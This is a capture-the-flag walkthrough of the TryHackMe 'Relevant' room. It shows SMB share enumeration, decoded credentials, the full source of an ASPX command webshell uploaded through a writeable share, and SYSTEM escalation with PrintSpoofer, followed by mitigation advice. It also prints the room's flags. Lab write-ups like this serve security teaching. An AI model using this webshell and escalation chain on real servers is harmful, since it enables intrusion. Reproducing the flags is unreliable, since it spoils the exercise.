# TryHackMe: Relevant - Professional Walkthrough

## Executive Summary
Relevant is a Windows-based CTF that tests enumeration skills, understanding of SMB shares, and Windows privilege escalation techniques. The attack path involves identifying an insecurely configured SMB share that is also served via a web server, gaining initial access through a webshell, and escalating privileges by leveraging the `SeImpersonatePrivilege` using the `PrintSpoofer` exploit.

---

## Phase 1: Information Gathering & Enumeration

### 1.1 Network Scanning
We started with a comprehensive Nmap scan to identify all open ports and services.

**Command:**
```bash
nmap -sC -sV -p- -T4 10.49.133.6
```

**Results:**
| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 80 | Open | HTTP | Microsoft IIS httpd 10.0 |
| 135 | Open | MSRPC | Microsoft Windows RPC |
| 139 | Open | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | Open | SMB | Windows Server 2016 Standard Evaluation 14393 |
| 3389 | Open | RDP | Microsoft Windows RDP |
| 49663 | Open | HTTP | Microsoft IIS httpd 10.0 |
| 49666 | Open | MSRPC | Microsoft Windows RPC |
| 49667 | Open | MSRPC | Microsoft Windows RPC |

**Key Observations:**
- Standard IIS on port 80.
- SMB is active on port 445.
- A high-port HTTP service is running on **49663**.

### 1.2 SMB Enumeration
We enumerated the SMB shares to find any accessible data or writeable directories.

**Command:**
```bash
nmap --script smb-enum-shares.nse -p445 10.49.133.6
```

**Output:**
```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk      
```

The `nt4wrksv` share allows **Anonymous READ/WRITE** access.

### 1.3 Looting the Share
Connecting to the share anonymously:
```bash
smbclient //10.49.133.6/nt4wrksv -N
```

We found a file named `passwords.txt`.
```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

**Decoding the Base64:**
- `Bob - !P@$$W0rD!123`
- `Bill - Juw4nnaM4n420696969!$$$`

---

## Phase 2: Vulnerability Analysis & Initial Access

### 2.1 Mapping SMB to Web
While investigating the web services, we tested if the `nt4wrksv` share was reachable via HTTP.
- `http://10.49.133.6/nt4wrksv/passwords.txt` -> **404 Not Found**
- `http://10.49.133.6:49663/nt4wrksv/passwords.txt` -> **200 OK** (Content visible)

**Vulnerability Identified:** The SMB share `nt4wrksv` is writeable by any user and is directly exposed as a web directory on port 49663. This allows for arbitrary file upload and remote code execution (RCE).

### 2.2 Exploitation: Webshell Upload
We crafted a simple ASPX webshell (`simple.aspx`) to execute commands.

**Webshell Content:**
```aspx
<%@ Page Language="C#" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request["cmd"];
        if (cmd != null) {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
```

**Uploading via SMB:**
```bash
smbclient //10.49.133.6/nt4wrksv -N -c "put simple.aspx"
```

**Command Execution:**
Accessing `http://10.49.133.6:49663/nt4wrksv/simple.aspx?cmd=whoami` returned:
`iis apppool\defaultapppool`

### 2.3 User Flag
Navigating to Bob's desktop:
`http://10.49.133.6:49663/nt4wrksv/simple.aspx?cmd=type%20C:\Users\Bob\Desktop\user.txt`

**User Flag:** `THM{fdk4ka34vk346ksxfr21tg789ktf45}`

---

## Phase 3: Privilege Escalation

### 3.1 Privilege Enumeration
We checked the current user's privileges to identify potential escalation vectors.

**Command:** `whoami /priv`

**Findings:**
- `SeImpersonatePrivilege` is **Enabled**.

### 3.2 Exploiting SeImpersonatePrivilege
On Windows Server 2016 (Build 14393), `SeImpersonatePrivilege` can be exploited using `PrintSpoofer`. This tool triggers a service to connect to a named pipe we control, allowing us to impersonate the `SYSTEM` token.

**Steps:**
1.  Downloaded `PrintSpoofer64.exe`.
2.  Uploaded it to the writeable share:
    ```bash
    smbclient //10.49.133.6/nt4wrksv -N -c "put PrintSpoofer64.exe"
    ```
3.  Executed the exploit to read the root flag and redirect output to a file:
    ```bash
    C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -c "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > out.txt"
    ```
4.  Accessed the output: `http://10.49.133.6:49663/nt4wrksv/out.txt`

**Root Flag:** `THM{1fk5kf469devly1gl320zafgl345pv}`

---

## Lessons Learned & Mitigation
1.  **Insecure SMB Configuration:** Never allow anonymous write access to shares, especially those mapped to web roots.
2.  **Service Exposure:** Minimize the number of exposed ports. Port 49663 should have been restricted.
3.  **Privilege Management:** Service accounts should follow the Principle of Least Privilege (PoLP). `SeImpersonatePrivilege` is powerful and should only be granted where absolutely necessary.
4.  **Patch Management:** Ensure the OS is patched against known token impersonation techniques.
